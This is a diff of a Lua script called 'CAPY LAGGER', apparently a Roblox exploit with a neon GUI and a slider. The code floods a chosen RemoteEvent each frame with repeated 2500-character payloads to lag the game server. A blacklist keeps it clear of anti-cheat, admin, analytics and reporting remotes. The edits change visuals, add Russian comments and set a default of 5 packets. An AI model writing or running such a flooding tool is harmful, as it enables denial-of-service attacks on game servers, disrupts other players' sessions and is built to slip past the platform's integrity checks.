@@ -1,8 +1,9 @@
 --[[
-    CAPY LAGGER: VOID APOCALYPSE (FINAL + FIX)
-    - Updated Blacklist: Now blocks that specific UUID Remote
+    CAPY LAGGER: VOID APOCALYPSE (PERFECT FINAL)
     - Visuals: Clean Void (No Shadows)
-    - Logic: True 0.00s Instant Stop
+    - Logic: Instant Stop (0.00s)
+    - Default: 5 Packets
+    - Status: Always shows Event Name
 ]]
 
 local Players = game:GetService("Players")
@@ -15,13 +16,10 @@ local Debris = game:GetService("Debris")
 
 local LocalPlayer = Players.LocalPlayer
 
--- // ⛔ 100% BLACKLIST (UPDATED) ⛔ //
+-- // ⛔ 100% BLACKLIST (BLOCKS EVERYTHING HERE) ⛔ //
 local blacklistedNames = {
-    -- ТОТ САМЫЙ РЕМОУТ ИЗ СКРИНШОТА:
     "352aad58-c786-4998-886b-3e4fa390721e", 
     "RE/352aad58-c786-4998-886b-3e4fa390721e",
-
-    -- Остальной мусор:
     "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel", "IntegrityCheckProcessor", 
     "LocalizationTableAnalyticsSender", "LocalizationService", "Analytics", "Telemetry", 
     "Logger", "Reporter", "CanChatWith", "SetPlayerBlockList", "UpdatePlayerBlockList",
@@ -47,7 +45,8 @@ local blacklistedNames = {
     "RE/TutorialService/StartTutorial", "RE/TutorialService/FinishTutorial", "RE/TeleportService/Reconnect"
 }
 
-local State = {LagEnabled = false, Target = nil, Packets = 10, Max = 250, UUID = HttpService:GenerateGUID(false)}
+-- Ставим 5 пакетов по умолчанию
+local State = {LagEnabled = false, Target = nil, Packets = 5, Max = 200, UUID = HttpService:GenerateGUID(false)}
 
 -- // UI ENGINE //
 if CoreGui:FindFirstChild("CapyApocalypse") then CoreGui.CapyApocalypse:Destroy() end
@@ -66,8 +65,6 @@ local Main = New("Frame", {
     Parent = Screen, Size = UDim2.new(0, 320, 0, 420), Position = UDim2.new(0.5, -160, 0.5, -210),
     BackgroundColor3 = Color3.fromRGB(5, 5, 5), BorderSizePixel = 0
 }, 20)
-
--- (Тень удалена полностью)
 
 local Stroke = New("UIStroke", {Parent = Main, Thickness = 3, Color = Color3.fromRGB(0, 255, 150)})
 local Grad = New("UIGradient", {Parent = Stroke, Color = ColorSequence.new(Color3.fromRGB(0,255,150), Color3.fromRGB(0,100,255))})
@@ -116,8 +113,12 @@ for i = 1, 20 do
 end
 
 -- // STATUS BAR //
-local StatusFrame = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,25), Position = UDim2.new(0.1,0,0,60), BackgroundColor3 = Color3.new(0,0,0)}, 5)
-local StatusText = New("TextLabel", {Parent = StatusFrame, Size = UDim2.new(1,0,1,0), Text = "> INITIALIZING...", Font = Enum.Font.Code, TextSize = 12, TextColor3 = Color3.new(0.6,0.6,0.6), BackgroundTransparency = 1})
+-- Текст сделан чуть меньше для красоты, без черной рамки
+local StatusText = New("TextLabel", {
+    Parent = Main, Size = UDim2.new(0.9,0,0,30), Position = UDim2.new(0.05,0,0,60), 
+    Text = "> INITIALIZING...", Font = Enum.Font.Code, TextSize = 11, 
+    TextColor3 = Color3.new(0.6,0.6,0.6), BackgroundTransparency = 1, ZIndex = 6
+})
 
 -- // REACTOR CORE BUTTON //
 local CoreBase = New("Frame", {Parent = Main, Size = UDim2.new(0,150,0,150), Position = UDim2.new(0.5,-75,0.45,-20), BackgroundColor3 = Color3.fromRGB(15,15,20)}, 100)
@@ -133,15 +134,17 @@ local CoreIcon = New("ImageLabel", {
     Image = "rbxassetid://6031068426", ImageColor3 = Color3.fromRGB(0,255,150), BackgroundTransparency = 1, ZIndex = 7
 })
 
--- // SLIDER //
-local SliderBox = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,50), Position = UDim2.new(0.1,0,0.8,0), BackgroundTransparency = 1})
-local SliderLab = New("TextLabel", {Parent = SliderBox, Size = UDim2.new(1,0,0,20), Text = "OVERLOAD: 10", Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = Color3.new(0.8,0.8,0.8), BackgroundTransparency = 1})
+-- // SLIDER (РЕГУЛИРОВКА) //
+local SliderBox = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,50), Position = UDim2.new(0.1,0,0.82,0), BackgroundTransparency = 1})
+local SliderLab = New("TextLabel", {Parent = SliderBox, Size = UDim2.new(1,0,0,20), Text = "OVERLOAD: " .. State.Packets, Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = Color3.new(0.8,0.8,0.8), BackgroundTransparency = 1})
 local SliderBar = New("TextButton", {Parent = SliderBox, Size = UDim2.new(1,0,0,6), Position = UDim2.new(0,0,0,30), BackgroundColor3 = Color3.fromRGB(30,30,35), Text = ""}, 5)
-local SliderFill = New("Frame", {Parent = SliderBar, Size = UDim2.new(0.1,0,1,0), BackgroundColor3 = Color3.fromRGB(0,255,150)}, 5)
+-- Заполняем слайдер согласно 5 пакетам (5/200)
+local SliderFill = New("Frame", {Parent = SliderBar, Size = UDim2.new(State.Packets/State.Max,0,1,0), BackgroundColor3 = Color3.fromRGB(0,255,150)}, 5)
 
 -- // LOGIC //
 local function UpdateUI(on)
     if on then
+        -- ВКЛЮЧЕНО
         Tw(CoreBase, {BackgroundColor3 = Color3.fromRGB(40,10,10)})
         Tw(CoreStroke, {Color = Color3.new(1,0,0)})
         Tw(CoreIcon, {ImageColor3 = Color3.new(1,1,1), Rotation = 180})
@@ -149,12 +152,19 @@ local function UpdateUI(on)
         StatusText.Text = "> !! SYSTEM OVERLOAD !!"
         StatusText.TextColor3 = Color3.new(1,0,0)
     else
+        -- ВЫКЛЮЧЕНО
         Tw(CoreBase, {BackgroundColor3 = Color3.fromRGB(15,15,20)})
         Tw(CoreStroke, {Color = Color3.fromRGB(0,255,150)})
         Tw(CoreIcon, {ImageColor3 = Color3.fromRGB(0,255,150), Rotation = 0})
         Tw(Stroke, {Color = Color3.fromRGB(0,255,150)})
-        StatusText.Text = "> STANDBY"
-        StatusText.TextColor3 = Color3.new(0,1,0.6)
+        
+        -- ВОЗВРАЩАЕМ ИМЯ ИВЕНТА
+        if State.Target then
+            StatusText.Text = "> CONNECTED: " .. State.Target.Name
+            StatusText.TextColor3 = Color3.new(0,1,0.6)
+        else
+            StatusText.Text = "> STANDBY"
+        end
     end
 end
 
@@ -177,10 +187,7 @@ RunService.RenderStepped:Connect(function()
         SliderFill.Size = UDim2.new(p,0,1,0)
         State.Packets = math.max(1, math.floor(p * State.Max))
         SliderLab.Text = "OVERLOAD: "..State.Packets
-        SliderFill.BackgroundColor3 = Color3.fromHSV((1-p)*0.3, 1, 1)
-    end
-    if State.LagEnabled then
-        CoreBase.Position = UDim2.new(0.5,-75 + math.random(-1,1),0.45,-20 + math.random(-1,1))
+        SliderFill.BackgroundColor3 = Color3.fromHSV((1-p)*0.35, 1, 1)
     end
 end)
 
@@ -216,7 +223,7 @@ RunService.Heartbeat:Connect(function()
     if not State.LagEnabled or not State.Target then return end
     local p = string.rep("X", 2500)
     for i = 1, State.Packets do
-        if not State.LagEnabled then break end
+        if not State.LagEnabled then break end -- Instant Stop
         pcall(function() State.Target:FireServer(State.UUID, p) end)
     end
 end)
